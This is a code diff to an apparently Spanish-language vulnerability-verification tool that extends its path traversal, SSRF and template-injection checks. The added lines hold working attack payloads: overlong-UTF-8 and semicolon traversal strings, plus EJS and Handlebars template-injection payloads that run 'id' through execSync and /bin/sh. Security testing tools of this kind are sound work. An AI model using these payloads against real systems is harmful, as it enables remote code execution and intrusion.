@@ -2978,6 +2978,12 @@ def verify_generic_path_traversal(
         attempts += [("..%u002f" * n) + rel for n in (2, 4, 6, 8)]
         attempts += [("..%u2215" * n) + rel for n in (2, 4, 6, 8)]
         attempts += [("..%ef%bc%8f" * n) + rel for n in (2, 4, 6, 8)]
+        # UTF-8 overlong encoding: ..%c0%af (0xC0 0xAF encodes '/' in modified UTF-8 — historical
+        # bypass for older Java servlet containers and IIS before normalization was enforced)
+        attempts += [("..%c0%af" * n) + rel for n in (2, 4, 6, 8)]
+        # Semicolon separator bypass: Tomcat/Spring accept ';' as path parameter delimiter,
+        # so '/..;/' traverses one directory on some JVM-based stacks
+        attempts += [("..;/" * n) + rel for n in (2, 4, 6, 8)]
         # Payload_kb extended encodings (deduplicates automatically at probe time)
         try:
             from .payload_kb import load_path_traversal_encodings as _lpt
@@ -4266,6 +4272,18 @@ def verify_generic_ssrf(
             time.sleep(1)
             log = lab.listener_log()
             entry["token_en_log"] = token in log
+            # Async-processed SSRF (webmentions, webhooks, job queues): some endpoints accept
+            # the SSRF URL immediately (202/201/200) but process it asynchronously. Poll the
+            # listener for up to 8 extra seconds before giving up on this URL variant.
+            if not (token in log) and _resp_status in (200, 201, 202, 204):
+                for _extra_wait in (2, 2, 4):
+                    if token in log:
+                        break
+                    time.sleep(_extra_wait)
+                    log = lab.listener_log()
+                if token in log:
+                    entry["token_en_log"] = True
+                    entry["via"] = "async-delay"
             # JSON body retry: if the form-encoded attempt got a 400/415 (or if any param key
             # suggests JSON), retry with Content-Type: application/json and json= body. Many
             # modern APIs (FastAPI, Django REST, Node.js) only accept JSON bodies and silently
@@ -6375,6 +6393,12 @@ def verify_generic_ssti(
             _engine_key = "smarty"
         elif any(x in _hint_text for x in ("erb", "rails", "sinatra")):
             _engine_key = "erb"
+        elif any(x in _hint_text for x in ("ejs",)):
+            _engine_key = "ejs"
+        elif any(x in _hint_text for x in ("pug", "jade")):
+            _engine_key = "pug"
+        elif any(x in _hint_text for x in ("handlebars", "hbs", "mustache")):
+            _engine_key = "handlebars"
         _ENGINE_FRONT_PAYLOADS = {
             "jinja2":     [f"{{{{{mul}}}}}", "{{config}}", "{{''.__class__}}", f"${{{mul}}}"],
             "twig":       [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}", f"{{{{ {mul} }}}}"],
@@ -6382,6 +6406,15 @@ def verify_generic_ssti(
             "pebble":     [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}"],
             "smarty":     [f"{{{{{mul}}}}}", f"{{math equation=\"{mul}\"}}"],
             "erb":        [f"<%= {mul} %>", f"#{{({mul})}}", f"<%={mul}%>"],
+            "ejs":        [f"<%={mul}%>", f"<%-{mul}%>", f"<%= {mul} %>",
+                           "<%- global.process.mainModule.require('child_process')"
+                           ".execSync('id').toString() %>"],
+            "pug":        ["#{7*7}", f"-var x = {mul};\n=x", f"= {mul}"],
+            "handlebars": [f"{{{{{mul}}}}}", "{{7*7}}",
+                           "{{#with 'con'structo'r'}}{{#with split as |a|}}"
+                           "{{#with (lookup a '0')}}{{#with (lookup . 'apply')}}"
+                           "{{this '7' '7' (lookup (lookup . 'proto') 'exec') '/bin/sh' '-c' 'id'}}"
+                           "{{/with}}{{/with}}{{/with}}{{/with}}"],
             "generic":    [],
         }
         _front = _ENGINE_FRONT_PAYLOADS.get(_engine_key, [])
@@ -6440,7 +6473,12 @@ def verify_generic_ssti(
                 except Exception as e:
                     tried.append({"payload": payload_value, "error": str(e)})
                     continue
-                matched = bool(pattern.search(resp.text or ""))
+                _resp_text = resp.text or ""
+                matched = bool(pattern.search(_resp_text))
+                # For RCE-class SSTI payloads (EJS execSync, Handlebars), also check uid= output
+                if not matched and "uid=" in _resp_text and "execSync" in payload_value:
+                    matched = True
+                    res.evidence["ssti_rce_signal"] = "uid= found in response from execSync payload"
                 tried.append({"payload": payload_value, "status": resp.status_code,
                               "resultado_presente": matched})
                 if matched:
@@ -6448,7 +6486,7 @@ def verify_generic_ssti(
                     win_ep, win_param = cand_ep, cand_p
                     res.evidence["payload_ganador"] = payload_value
                     res.evidence["resultado_esperado_ganador"] = payload_expected
-                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                    res.evidence["respuesta_cuerpo_recorte"] = _resp_text[:500]
                     step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                          f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                     _ssti_url = base_url + ep_path
@@ -13737,3 +13775,5 @@ def verify_generic_user_enumeration(
     except Exception as e:
         res.detail = f"error inesperado en verify_generic_user_enumeration: {e}"
         return res
+
+
